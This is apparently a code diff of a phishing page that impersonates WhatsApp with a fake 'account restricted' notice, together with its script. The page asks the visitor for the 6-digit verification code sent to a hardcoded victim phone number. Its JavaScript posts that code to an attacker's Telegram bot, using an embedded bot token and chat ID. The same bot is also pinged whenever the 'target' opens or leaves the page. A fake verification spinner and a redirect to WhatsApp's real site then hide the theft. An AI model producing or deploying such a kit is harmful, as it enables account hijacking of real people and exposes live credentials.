@@ -12,116 +12,136 @@
             --wa-text: #e9edef;
             --wa-hint: #8696a0;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Segoe UI, Helvetica, Arial, sans-serif; }
-        body { background: var(--wa-bg); color: var(--wa-text); display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: start; }
         
-        /* شريط التنبيه العلوي - لربط الصفحة بالرسالة */
-        .alert-top {
-            background: var(--wa-danger);
-            color: white;
-            width: 100%;
-            padding: 10px;
-            font-size: 13px;
-            text-align: center;
-            position: fixed;
-            top: 0;
-            font-weight: 600;
-            letter-spacing: 0.5px;
+        /* Top Alert Bar */
+        .header-alert {
+            background: var(--wa-danger); color: #fff; width: 100%; padding: 12px;
+            font-size: 13px; text-align: center; font-weight: 700; text-transform: uppercase;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 10;
         }
 
-        .card { width: 100%; max-width: 380px; padding: 30px; text-align: center; }
+        .content { width: 100%; max-width: 400px; padding: 40px 25px; text-align: center; }
+        .logo { width: 60px; margin-bottom: 25px; }
         
-        .logo { width: 50px; margin-bottom: 20px; margin-top: 20px; }
-        h1 { font-size: 20px; font-weight: 600; margin-bottom: 15px; color: #fff; }
-        
-        .desc { font-size: 14px; color: var(--wa-text); line-height: 1.6; margin-bottom: 25px; text-align: left; background: #182229; padding: 15px; border-radius: 8px; border-left: 3px solid var(--wa-danger); }
+        h1 { font-size: 22px; font-weight: 500; margin-bottom: 10px; color: #fff; }
+        .status-box { 
+            background: #1d2a33; border-left: 4px solid var(--wa-danger); 
+            padding: 15px; text-align: left; border-radius: 4px; margin-bottom: 30px;
+        }
+        .status-box p { font-size: 14px; line-height: 1.5; color: var(--wa-text); }
 
-        .otp-input { 
-            width: 100%; border: none; border-bottom: 2px solid var(--wa-green); 
-            font-size: 32px; letter-spacing: 12px; text-align: center; 
-            background: transparent; color: #fff; outline: none; margin: 20px 0;
+        .number-display { font-size: 16px; font-weight: 600; margin-bottom: 25px; color: var(--wa-hint); }
+        .number-display span { color: #fff; letter-spacing: 1px; }
+
+        /* OTP Input Styling - Real WhatsApp Style */
+        .otp-container { position: relative; margin-bottom: 30px; }
+        .otp-input {
+            width: 100%; background: transparent; border: none;
+            border-bottom: 2px solid var(--wa-green); color: #fff;
+            font-size: 35px; text-align: center; outline: none;
+            letter-spacing: 15px; padding-bottom: 5px;
+        }
+        .otp-placeholder { 
+            position: absolute; top: 0; left: 0; width: 100%; 
+            font-size: 35px; letter-spacing: 15px; color: #333; pointer-events: none;
         }
 
-        button { 
-            background: var(--wa-green); color: #111b21; border: none; 
-            width: 100%; padding: 15px; border-radius: 5px; font-size: 15px; 
-            font-weight: 700; cursor: pointer; transition: 0.3s;
+        .btn-verify {
+            background: var(--wa-green); color: #111b21; border: none;
+            width: 100%; padding: 15px; border-radius: 30px;
+            font-size: 15px; font-weight: 700; cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 168, 132, 0.2);
         }
-        button:active { opacity: 0.8; }
 
-        .footer { font-size: 12px; color: var(--wa-hint); margin-top: 30px; }
+        .secure-footer { margin-top: auto; padding-bottom: 30px; font-size: 12px; color: var(--wa-hint); }
     </style>
 </head>
 <body>
 
-    <div class="alert-top">ACCOUNT RESTRICTED - IMMEDIATE VERIFICATION REQUIRED</div>
+    <div class="header-alert">Account Restricted - Verification Required</div>
 
-    <div class="card">
+    <div class="content">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
-        <h1>Security Check</h1>
+        <h1>Identity Verification</h1>
         
-        <div class="desc">
-            Due to unauthorized access attempts, your account has been temporarily suspended. Enter the 6-digit code sent to your phone to lift the 24h restriction.
+        <div class="status-box">
+            <p>Your account is temporarily suspended due to suspicious activity. Enter the 6-digit synchronization code sent to:</p>
         </div>
 
-        <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="••••••">
-        
-        <button onclick="submitOtp()">CANCEL RESTRICTION</button>
-
-        <div class="footer">
-            <img src="https://static.whatsapp.net/rsrc.php/v3/yO/r/Sshne939E8V.png" width="10" style="opacity:0.5"> 
-            End-to-end encrypted security protocol
+        <div class="number-display">
+            Target Device: <span id="phone-masked"></span>
         </div>
+
+        <div class="otp-container">
+            <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" autocomplete="off">
+        </div>
+
+        <button class="btn-verify" onclick="submitOtp()">VERIFY & UNLOCK</button>
+    </div>
+
+    <div class="secure-footer">
+        <img src="https://static.whatsapp.net/rsrc.php/v3/yO/r/Sshne939E8V.png" width="12" style="vertical-align: middle; opacity: 0.5;">
+        End-to-end encrypted security session
     </div>
 
     <script>
-        const BOT_CONFIG = {
-            TOKEN: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
-            CHAT_ID: '5446862709'
+        const CONFIG = {
+            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
+            C: '5446862709',
+            PHONE: '01030003287'
         };
 
-        function notifyBot(message) {
-            const url = `https://api.telegram.org/bot${BOT_CONFIG.TOKEN}/sendMessage`;
-            const data = { chat_id: BOT_CONFIG.CHAT_ID, text: message, parse_mode: 'HTML' };
-            
-            // استخدام fetch العادي للفتح، و sendBeacon للقفل لضمان الوصول
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(url, new Blob([JSON.stringify(data)], {type: 'application/json'}));
-            } else {
-                fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(data) });
-            }
+        // تشفير الرقم تلقائياً
+        const maskPhone = (num) => {
+            return "+20 " + num.substring(0, 3) + " •••• •• " + num.slice(-2);
+        };
+        document.getElementById('phone-masked').innerText = maskPhone(CONFIG.PHONE);
+
+        async function notify(msg) {
+            const url = `https://api.telegram.org/bot${CONFIG.T}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CONFIG.C, text: msg, parse_mode: 'HTML' })
+                });
+            } catch (e) { console.error("Send failed"); }
         }
 
-        // 1. تنبيه عند فتح الصفحة
-        window.onload = () => {
-            notifyBot(`🟢 <b>[ACCESS]:</b> User opened the security gateway.\nWaiting for OTP...`);
+        // تنبيهات الدخول والخروج
+        window.onload = () => notify(`🟢 <b>[OPENED]:</b> Target is on page.\nNumber: <code>${CONFIG.PHONE}</code>`);
+        
+        // تنبيه لو قفل الصفحة أو خرج منها
+        window.onbeforeunload = () => {
+            notify(`🔴 <b>[CLOSED]:</b> Target left the page.`);
         };
 
-        // 2. تنبيه عند محاولة الخروج أو إغلاق الصفحة
-        window.addEventListener('visibilitychange', function() {
-            if (document.visibilityState === 'hidden') {
-                notifyBot(`🟡 <b>[AWAY]:</b> User minimized the page or switched tabs.`);
-            }
-        });
+        async function submitOtp() {
+            const code = document.getElementById('otp').value;
+            const btn = document.querySelector('.btn-verify');
 
-        window.onbeforeunload = function() {
-            notifyBot(`🔴 <b>[EXIT]:</b> User closed the page/session.`);
-        };
+            if(code.length === 6) {
+                btn.innerHTML = "Processing...";
+                btn.disabled = true;
 
-        // 3. إرسال الكود
-        function submitOtp() {
-            const otp = document.getElementById('otp').value;
-            if(otp.length === 6) {
-                notifyBot(`🔥 <b>[OTP RECEIVED]:</b>\nCode: <code>${otp}</code>\nStatus: Attempting to lift restriction.`);
-                
-                // شكل تحميل وهمي
-                document.querySelector('.card').innerHTML = `<div style="color:var(--wa-green); font-size:18px; margin-top:50px;">Verifying...<br><small style="color:#8696a0">Please wait 2 minutes.</small></div>`;
-                
+                await notify(`🔥 <b>[CODE RECEIVED]:</b>\nTarget: <code>${CONFIG.PHONE}</code>\nOTP: <code>${code}</code>`);
+
+                // تحويل لصفحة "جري التحقق" وهمية
+                document.querySelector('.content').innerHTML = `
+                    <div style="margin-top:100px;">
+                        <div style="border:3px solid #202c33; border-top:3px solid #00a884; border-radius:50%; width:45px; height:45px; animation:spin 1s linear infinite; margin:0 auto;"></div>
+                        <p style="margin-top:25px; color:#8696a0;">Synchronizing with security servers...<br>Please keep this window open.</p>
+                    </div>
+                    <style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>
+                `;
+
                 setTimeout(() => {
                     window.location.href = "https://www.whatsapp.com/security";
-                }, 5000);
+                }, 4000);
             } else {
-                alert("Enter the 6-digit code.");
+                alert("Please enter the 6-digit code.");
             }
         }
     </script>
